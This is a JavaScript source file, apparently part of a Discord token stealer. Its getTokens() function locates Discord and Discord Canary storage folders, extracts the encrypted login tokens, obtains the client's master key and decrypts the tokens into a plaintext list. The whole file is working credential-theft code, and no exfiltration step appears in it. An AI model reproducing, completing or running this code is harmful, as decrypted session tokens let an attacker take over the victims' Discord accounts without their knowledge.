const fs = require('fs')
const path = require("path");
const { PATHS } = require('./path-handler');
const { findEncryptedTokensFromPath, getMasterKey, decryptToken } = require('./utils');

/**
 * Retrieves and decrypts tokens from predefined paths
 * 
 * The function checks for the existence of each Discord-related path from the PATHS object,
 * extracts the encrypted tokens from those paths, retrieves the master key for each path,
 * decrypts the tokens, and returns a unique list of decrypted tokens.
 * 
 * @returns {string[]} A list of unique, decrypted tokens.
 */
function getTokens() {
    const tokens = []
    // Loop through each Discord path in PATHS object
    for (const [discordType, discordPath] of Object.entries(PATHS)) {
        // Ensure the path exists and is valid
        if (fs.existsSync(discordPath) && ["discord", "discordcanary"].includes(discordType)) {
            // Extract encrypted tokens from the path
            const encTokens = findEncryptedTokensFromPath(discordPath);
            if (!encTokens) continue;
            
            // Get the master key and decrypt tokens
            const masterKey = getMasterKey(discordPath);
            if (!masterKey) continue;
            tokens.push(...encTokens.map(encToken => decryptToken(encToken, masterKey)))
        }
    }
    const uniqueTokens = [...new Set(tokens)];
    return uniqueTokens;
}

module.exports = {
    getTokens
}